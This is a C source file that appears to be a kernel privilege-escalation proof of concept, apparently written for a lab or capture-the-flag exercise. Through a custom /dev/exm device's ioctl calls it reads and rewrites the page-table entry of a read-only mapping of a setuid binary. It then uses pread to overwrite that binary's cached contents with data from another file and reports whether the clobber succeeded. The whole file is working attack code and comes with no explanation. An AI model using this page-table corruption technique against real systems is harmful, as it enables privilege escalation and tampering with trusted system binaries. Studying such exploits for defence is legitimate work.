#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

typedef int u32;
typedef int pud_t;
#define _AT(T, X) ((T)(X))

#include "asm/pgtable-2level-hwdef.h"
#include "asm/pgtable-2level-types.h"
#include "asm/pgtable-2level.h"

#include "exm.h"

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

int main()
{
    pte_t pte;
    int suid = SYSCHK(open("/sbin/suid", O_RDONLY));
    int fake = SYSCHK(open("/sbin/fake", O_RDONLY));
    int exm = SYSCHK(open("/dev/exm", O_RDWR));
    const int size = 0x1000;
    void* base = (void*)0x40000000;
    void* addr = SYSCHK(mmap(base, 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, suid, 0));
    printf("addr %p\n", addr);

    *(volatile char*)addr;

    pte = ioctl(exm, IOC_GET_PTE, addr);
    printf("pte %x\n", pte);


    struct pte_op op = {
        .addr = (unsigned long)addr,
        .pte_val = pte + 0xfffffe00
    };
    SYSCHK(ioctl(exm, IOC_SET_PTE, &op));
    pte_t npte = ioctl(exm, IOC_GET_PTE, addr);
    printf("new pte %x\n", npte);

    *(volatile char*)addr;

    bool suid_corrupted = false;
    for (int j = 0; j < 4; j++) {
        int res = pread(fake, addr, size, 0);
        if (res == -1) {
            if (errno != EFAULT)
                perror("read into possibly-corrupted PTE failed");
            continue;
        }
        printf("clobber via corrupted PTE succeeded\n");
        suid_corrupted = true;
        break;
    }

    if (suid_corrupted) {
        puts("SUCCESS");
        // break;
    } else {
        puts("FAILED");
        exit(1);
    }

    pte = ioctl(exm, IOC_GET_PTE, addr);
    printf("pte %x\n", pte);

    char buf[size];
    int n = SYSCHK(read(suid, buf, size));
    printf("SUID is: %.4s\n", buf);

    return 0;
}